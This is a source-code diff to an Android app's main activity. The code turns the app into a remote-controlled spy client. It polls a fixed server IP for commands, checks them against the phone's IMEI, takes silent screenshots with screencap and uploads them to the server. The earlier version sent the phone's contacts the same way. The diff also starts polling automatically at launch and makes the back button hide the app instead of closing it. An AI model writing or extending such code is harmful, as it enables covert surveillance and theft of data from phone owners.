@@ -13,28 +13,21 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.List;
 
-import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
-import org.apache.http.HttpVersion;
 import org.apache.http.NameValuePair;
-import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.mime.HttpMultipartMode;
 import org.apache.http.entity.mime.MultipartEntity;
-import org.apache.http.entity.mime.content.ContentBody;
 import org.apache.http.entity.mime.content.FileBody;
 import org.apache.http.entity.mime.content.StringBody;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.params.CoreProtocolPNames;
 import org.apache.http.protocol.BasicHttpContext;
 import org.apache.http.protocol.HTTP;
 import org.apache.http.protocol.HttpContext;
 import org.apache.http.util.EntityUtils;
-import org.json.JSONException;
-import org.json.JSONObject;
 
 import android.app.Activity;  
 import android.content.ContentResolver;
@@ -53,6 +46,7 @@ import android.provider.ContactsContract.PhoneLookup;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
+import android.view.KeyEvent;
 import android.view.View;  
 import android.view.View.OnClickListener;  
 import android.widget.Button;  
@@ -71,7 +65,7 @@ public class MainActivity extends Activity {
     
     private static int delayTime = 5000;
     
-    private static String ipAddr = "192.168.1.9";
+    private static String ipAddr = "10.0.0.1";
   
     private Handler handler = new Handler();  
   
@@ -79,8 +73,8 @@ public class MainActivity extends Activity {
   
         public void run() {   
             if (run) {  
-                handler.postDelayed(this, delayTime);  
-                
+                handler.postDelayed(this, delayTime);            
+               
                 String command = getCommand();                
                 try{
 	    			if(!command.equals("noCommand")){
@@ -89,18 +83,25 @@ public class MainActivity extends Activity {
 	    				String command_type = temp[1];
 	    				String target = temp[2];
 	    				
-	    				String data = "";
+	    				String[] deviceInfo = getDeviceInfo();
+	    				String IMEI = deviceInfo[0];
 	    				
-	    				switch(Integer.parseInt(command_type)){
-	    					case 1:data = getPhoneContacts();break;
-	    					default:data = "invalidCommand";break;
-	    				}
-	    				
-	    				if(data != "invalidCommand"){
-	    					result = replyCommand(command_id,data);
+	    				if(IMEI.equals(target)){	    				
+		    				String data = "";		    				
+		    				switch(Integer.parseInt(command_type)){
+		    					case 1:data = replyPicture(command_id);break;
+		    					default:data = "invalidCommand";break;
+		    				}
+		    				
+		    				if(data != "invalidCommand"){
+		    					result = data;
+		    				}
+		    				else{
+		    					result = "invalidCommand";
+		    				}
 	    				}
 	    				else{
-	    					result = "invalidCommand";
+	    					result = "noCommand";
 	    				}
 	    				
 	    			}
@@ -111,6 +112,7 @@ public class MainActivity extends Activity {
                 catch(Exception ee) {  
         			result = ee.getMessage();
         		}
+                
             }  
             tvResult.setText(result);            
         }  
@@ -177,7 +179,7 @@ public class MainActivity extends Activity {
                 run = true;  
                 updateButton(5);  
                 //TODO
-                //handler.postDelayed(task, delayTime);  
+                handler.postDelayed(task, delayTime);  
                 //replyDeviceInfo();
                 //replyDeviceContacts();
                 //replyDeviceLocations();
@@ -210,8 +212,21 @@ public class MainActivity extends Activity {
         //replyDeviceCallingRecords();
         //getDeviceLocation();
         //replyPicture();
-          
+        
+        run = true;  
+        updateButton(5);  
+        handler.postDelayed(task, delayTime);
+         
     }  
+    
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+    	if (keyCode == KeyEvent.KEYCODE_BACK) {
+    			moveTaskToBack(false);
+    			return true;
+    	}
+    	return super.onKeyDown(keyCode, event);
+    }
   
     private void updateButton(int status) {  
         if(status == 1){
@@ -836,18 +851,26 @@ public class MainActivity extends Activity {
 		}
 	}
 	/**·µ»ØÍ¼Æ¬**/
-	public String replyPicture(){
+	public String replyPicture(String command_id){	
 		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
-        try{        	      	
-        	List <NameValuePair> params = new ArrayList <NameValuePair>();
-        	String fileName = "switch.jpg";
-	        params.add(new BasicNameValuePair("userfile", fileDirPath + "/" + fileName));
-	        
-	        return postPicture("http://" + ipAddr + "/prp/index.php/device/reply_picture",params,fileName,"image/jpeg");
-        }
-        catch(Exception e){
-        	return e.getMessage();
-        }	
+		String result = takePicture("",fileDirPath);
+        //String result = "sucess";
+        if(result.equals("sucess")){        	
+            try{        	      	
+            	List <NameValuePair> params = new ArrayList <NameValuePair>();
+            	String fileName = "img.png";
+    	        params.add(new BasicNameValuePair("userfile", fileDirPath + "/" + fileName));
+    	        params.add(new BasicNameValuePair("command_id", Base64.encodeToString(command_id.getBytes(),Base64.DEFAULT)));
+    	        
+    	        return postPicture("http://" + ipAddr + "/prp/index.php/device/reply_picture",params,fileName,"image/png");
+            }
+            catch(Exception e){
+            	return e.getMessage();
+            }	
+        } 
+        else{
+        	return result;        	
+        } 
 	}
 	public String postPicture(final String url, final List<NameValuePair> nameValuePairs, String fileName, String fileType) {
 	    final HttpClient httpClient = new DefaultHttpClient();
@@ -879,5 +902,16 @@ public class MainActivity extends Activity {
 	        e.printStackTrace();
 	        return e.getMessage();
 	    }
+	}
+	/**ºóÌ¨½ØÆÁ**/
+	public String takePicture(String file,String fileDirPath){
+		try{
+			
+			execCommand("/system/bin/screencap -p " + fileDirPath + "/img.png");
+	        return "sucess";
+		}
+		catch(Exception e){
+			return e.getMessage();
+		}		
 	}
 }  
